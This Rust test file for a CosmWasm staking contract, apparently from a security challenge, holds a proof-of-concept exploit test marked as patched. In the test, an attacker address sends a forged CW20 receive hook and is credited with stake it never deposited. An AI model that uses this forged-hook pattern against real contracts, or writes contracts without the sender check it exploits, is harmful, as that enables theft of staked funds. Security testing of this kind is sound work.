#[cfg(test)]
pub mod tests{
    use cosmwasm_std::{Addr, Uint128};
    use cw20::{MinterResponse, Cw20ReceiveMsg};
    use cw_multi_test::{App, Executor};

    use crate::{integration_tests::tests::{challenge_contract, token_contract, ADMIN, OWNER}, msg::{InstantiateMsg, Cw20HookMsg, ExecuteMsg, StakeResponse, QueryMsg}};
    pub const ATTACKER : &str = "attacker";

    #[ignore = "bug patched"]
    #[test]
    fn exploit(){
        let mut app = App::default();
        let cw_template_id = app.store_code(challenge_contract());
        let cw_20_id = app.store_code(token_contract());

        let token_inst = cw20_base::msg::InstantiateMsg {
            name: "Atom token".to_string(),
            symbol: "ATOM".to_string(),
            decimals: 6,
            initial_balances: vec![],
            mint: Some(MinterResponse {
                minter: ADMIN.to_string(),
                cap: None,
            }),
            marketing: None,
        };

        let token_addr = app
            .instantiate_contract(
                cw_20_id,
                Addr::unchecked(ADMIN),
                &token_inst,
                &[],
                "test",
                None,
            )
            .unwrap();


        let contract_addr = app
            .instantiate_contract(
            cw_template_id,
            Addr::unchecked(OWNER),
            &InstantiateMsg { 
                owner: Addr::unchecked(OWNER).to_string(), 
                token: token_addr.to_string(), 
            },
            &[],
            "Contract",
            None,
        )
        .unwrap();

        let encoded = cosmwasm_std::to_json_binary(&Cw20HookMsg::Stake {});
       
        app.execute_contract(
                Addr::unchecked(ATTACKER), 
                contract_addr.clone(), 
            &ExecuteMsg::Receive(Cw20ReceiveMsg {
                sender: ATTACKER.to_string(),
                amount: Uint128::new(2137),
                msg: encoded.unwrap(),
            }), 
            &[])
            .unwrap();
        
        let query_stkaing_info: StakeResponse = app
            .wrap()
            .query_wasm_smart(contract_addr, 
                &QueryMsg::StakerInfo{ staker: ATTACKER.to_string() 
            }).unwrap();

        assert_eq!(Uint128::new(2137),query_stkaing_info.amount);
    }
}